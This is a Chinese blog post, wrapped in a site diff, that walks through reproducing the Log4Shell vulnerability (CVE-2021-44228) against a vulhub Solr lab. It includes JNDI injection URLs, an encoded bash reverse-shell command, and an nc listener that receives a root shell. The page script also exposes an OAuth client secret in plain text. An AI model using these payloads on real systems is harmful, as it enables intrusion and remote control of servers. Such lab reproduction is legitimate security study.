@@ -1,0 +1,722 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="log4j 复现背景知识什么是 log4jdnslog 平台漏洞复现环境：  靶机 IP：192.1.1.128 攻击机 IP：192.1.1.128 中转机 IP：192.1.1.138  安装 vulhub安装 docker 和 docker-compose 后即可开始使用 vulhub 12sudo apt install docker.iosudo apt install docker-c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="log4j 复现">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/e185c3944248.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="log4j 复现背景知识什么是 log4jdnslog 平台漏洞复现环境：  靶机 IP：192.1.1.128 攻击机 IP：192.1.1.128 中转机 IP：192.1.1.138  安装 vulhub安装 docker 和 docker-compose 后即可开始使用 vulhub 12sudo apt install docker.iosudo apt install docker-c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0e191a6e9e73f78f1323bcfac6e2cee1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/c78026d737c76c30f1cf27f84fed7d30_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/78ca72608d4cbf5ca97c723c0de8cf6b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/028a636dffb351b5629bc9bd4574cade_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b947fa6246f91f85d5729bc7720b1b24_MD5.png">
+<meta property="article:published_time" content="2023-07-27T08:02:51.000Z">
+<meta property="article:modified_time" content="2023-07-27T11:59:51.801Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/0e191a6e9e73f78f1323bcfac6e2cee1_MD5.png">
+  
+  
+  
+  <title>log4j 复现 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="log4j 复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-27 16:02" pubdate>
+          2023年7月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          38 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">log4j 复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="log4j-复现"><a href="#log4j-复现" class="headerlink" title="log4j 复现"></a>log4j 复现</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="什么是-log4j"><a href="#什么是-log4j" class="headerlink" title="什么是 log4j"></a>什么是 log4j</h3><h3 id="dnslog-平台"><a href="#dnslog-平台" class="headerlink" title="dnslog 平台"></a>dnslog 平台</h3><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境：</p>
+<ul>
+<li>靶机 IP：192.1.1.128</li>
+<li>攻击机 IP：192.1.1.128</li>
+<li>中转机 IP：192.1.1.138</li>
+</ul>
+<h3 id="安装-vulhub"><a href="#安装-vulhub" class="headerlink" title="安装 vulhub"></a>安装 vulhub</h3><p>安装 docker 和 docker-compose 后即可开始使用 vulhub</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install docker.io<br>sudo apt install docker-compose<br></code></pre></td></tr></table></figure>
+
+<p>git 下载可以使用 <code>git config --global https.proxy &#39;socks5://IP:Port&#39;</code> 来使用本地的代理端口，达到加速下载的目的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure>
+
+<p>docker 拉取镜像建议换成国内源</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/docker<br>sudo <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerproxy.com&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.nju.edu.cn&quot;</span><br>    ]<br>&#125;<br>EOF<br>sudo systemctl daemon-reload<br>sudo systemctl restart docker<br><br><span class="hljs-comment"># 测试拉取速度</span><br>docker pull wordpress<br></code></pre></td></tr></table></figure>
+
+<p>切换到漏洞目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub-master/log4j/CVE-2021-44228<br></code></pre></td></tr></table></figure>
+
+<p>自动拉取镜像搭建漏洞环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulhub/log4j/CVE-2021-44228]<br>└─$ docker-compose up -d    <br>Pulling solr (vulhub/solr:8.11.0)...<br>8.11.0: Pulling from vulhub/solr<br>43c265008fae: Retrying <span class="hljs-keyword">in</span> 1 second<br>43c265008fae: Pull complete<br>af36d2c7a148: Pull complete<br>2b7b4d10e1c1: Pull complete<br>f264389d8f2f: Pull complete<br>1a2c46e93f4a: Pull complete<br>f9506bb322c0: Pull complete<br>96f5dad14c2c: Pull complete<br>c387eff49cc3: Pull complete<br>Digest: sha256:84255b20a2d134fc97bbb0fab7cb826087098ee594fcbc94c3a71def24d31003<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> vulhub/solr:8.11.0<br>Creating cve-2021-44228_solr_1 ... <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>使用 <code>docker ps</code> 命令查看访问端口，通过浏览器访问查看 web 服务是否正常</p>
+<p><img src="/pic/0e191a6e9e73f78f1323bcfac6e2cee1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="DNSLog-测试"><a href="#DNSLog-测试" class="headerlink" title="DNSLog 测试"></a>DNSLog 测试</h3><p>首先使用 DNSLog 平台获取一个域名，然后通过 burp 抓包后，在参数中添加 payload，并进行 URL 编码。</p>
+<p>构造 payload 的时候我们需要知道目标 URL，这个我们可以根据已有的博客或者官方的 API 文档得到</p>
+<p><img src="/pic/c78026d737c76c30f1cf27f84fed7d30_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/daoshad.dnslog.cn&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以直接在浏览器中访问上述链接（替换为自己的路径和域名）</p>
+<p>DNSLog.cn 中刷新得到了记录</p>
+<p><img src="/pic/78ca72608d4cbf5ca97c723c0de8cf6b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后在使用 JNDI 注入工具时，可能是版本问题，导致运行出现错误</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools]<br>└─$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c <span class="hljs-string">&quot; &#123;echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE3Mi4xOC4wLjEvNjk2OSAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 192.1.1.128<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>[ADDRESS] &gt;&gt; 192.1.1.128<br>[COMMAND] &gt;&gt; bash -c  &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+IC9kZXYvdGNwLzE3Mi4xOC4wLjEvNjk2OSAwPiYxCg==&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;<br>----------------------------JNDI Links---------------------------- <br>Target environment(Build <span class="hljs-keyword">in</span> JDK 1.8 whose trustURLCodebase is <span class="hljs-literal">true</span>):<br>rmi://192.1.1.128:1099/vy06r4<br>ldap://192.1.1.128:1389/vy06r4<br>Target environment(Build <span class="hljs-keyword">in</span> JDK whose trustURLCodebase is <span class="hljs-literal">false</span> and have Tomcat 8+ or SpringBoot 1.2.x+ <span class="hljs-keyword">in</span> classpath):<br>rmi://192.1.1.128:1099/jxriw9<br>Target environment(Build <span class="hljs-keyword">in</span> JDK 1.7 whose trustURLCodebase is <span class="hljs-literal">true</span>):<br>rmi://192.1.1.128:1099/j4u6ro<br>ldap://192.1.1.128:1389/j4u6ro<br><br>----------------------------Server Log----------------------------<br>2023-07-27 06:40:31 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180<br>2023-07-27 06:40:32 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099<br>2023-07-27 06:40:32 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389<br>2023-07-27 06:41:26 [RMISERVER]  &gt;&gt; Have connection from /172.18.0.2:41552<br>2023-07-27 06:41:26 [RMISERVER]  &gt;&gt; Reading message...<br>2023-07-27 06:41:26 [RMISERVER]  &gt;&gt; Is RMI.lookup call <span class="hljs-keyword">for</span> vy06r4 2<br>2023-07-27 06:41:26 [RMISERVER]  &gt;&gt; Closing connection<br>Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;Thread-1&quot;</span> java.lang.IllegalAccessError: class jndi.RMIRefServer (<span class="hljs-keyword">in</span> unnamed module @0x4015e7ec) cannot access class com.sun.jndi.rmi.registry.ReferenceWrapper (<span class="hljs-keyword">in</span> module jdk.naming.rmi) because module jdk.naming.rmi does not <span class="hljs-built_in">export</span> com.sun.jndi.rmi.registry to unnamed module @0x4015e7ec<br>        at jndi.RMIRefServer.handleRMI(RMIRefServer.java:343)<br>        at jndi.RMIRefServer.doCall(RMIRefServer.java:299)<br>        at jndi.RMIRefServer.doMessage(RMIRefServer.java:245)<br>        at jndi.RMIRefServer.run(RMIRefServer.java:190)<br>        at java.base/java.lang.Thread.run(Thread.java:833)<br></code></pre></td></tr></table></figure>
+
+<p>选了另一台 Ubuntu 的机器作为中转机，安装 openjdk 1.8.0_362 版本</p>
+<h3 id="反弹-shell-测试"><a href="#反弹-shell-测试" class="headerlink" title="反弹 shell 测试"></a>反弹 shell 测试</h3><p>工具使用的是 <a target="_blank" rel="noopener" href="https://github.com/zzwlpx/JNDIExploit">zzwlpx&#x2F;JNDIExploit: A malicious LDAP server for JNDI injection attacks (github.com)</a> 环境如前所述，在中转机上 1.8 版本的 java 运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ubuntu@ubuntu:~/tools/Log4j-exp/poc$ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.1.1.138<br>[+] LDAP Server Start Listening on 1389...<br>[+] HTTP Server Start Listening on 8080...<br></code></pre></td></tr></table></figure>
+
+<p>攻击机上开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 6666<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 6666 ...<br></code></pre></td></tr></table></figure>
+
+<p>接下来构造反弹 shell 的 payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/192.1.1.138:1389/</span>Basic<span class="hljs-regexp">/ReverseShell/</span><span class="hljs-number">192.1</span>.<span class="hljs-number">1.128</span>/<span class="hljs-number">6666</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在浏览器中访问得到如下界面</p>
+<p><img src="/pic/028a636dffb351b5629bc9bd4574cade_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>再看监听，发现反弹成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 6666<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 6666 ...<br>connect to [192.1.1.128] from (UNKNOWN) [172.18.0.2] 60728<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@21f80351de19:/opt/solr/server<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/b947fa6246f91f85d5729bc7720b1b24_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/2COe2VwHuHDywwqtekkWQQ">log4j-CVE-2021-44228-vulhub复现 (微信公众号乌鸦安全)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>log4j 复现</div>
+      <div>https://i3eg1nner.github.io/2023/07/e185c3944248.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/d967fa845029.html" title="Struct2(s2-045) 复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Struct2(s2-045) 复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/d14568407635.html" title="Obsidian 配置">
+                        <span class="hidden-mobile">Obsidian 配置</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'c6a0fe8f01e1820ba3d3e3db3bfb085d'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
